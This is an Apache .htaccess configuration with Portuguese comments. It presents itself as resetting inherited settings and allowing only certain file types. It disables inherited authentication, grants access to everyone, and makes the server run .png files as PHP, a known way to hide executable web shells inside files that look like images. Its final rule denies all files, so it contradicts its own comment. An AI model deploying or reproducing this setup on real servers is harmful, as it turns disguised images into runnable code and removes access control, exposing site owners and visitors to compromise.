# --- Reset de algumas heranças comuns ---
# Desliga reescritas de URL herdadas
RewriteEngine Off

# Desliga diretivas de cache herdadas
Header unset Cache-Control
Header unset Pragma
Header unset Expires

# Desliga autenticação herdada
Satisfy Any
Require all granted

# --- Regras para esta pasta ---
# Permitir apenas .php e .png e processar ambos como PHP
<FilesMatch "\.(php|png)$">
    SetHandler application/x-httpd-php
</FilesMatch>

# Bloquear todos os outros ficheiros
<FilesMatch ".*">
    Require all denied
</FilesMatch>
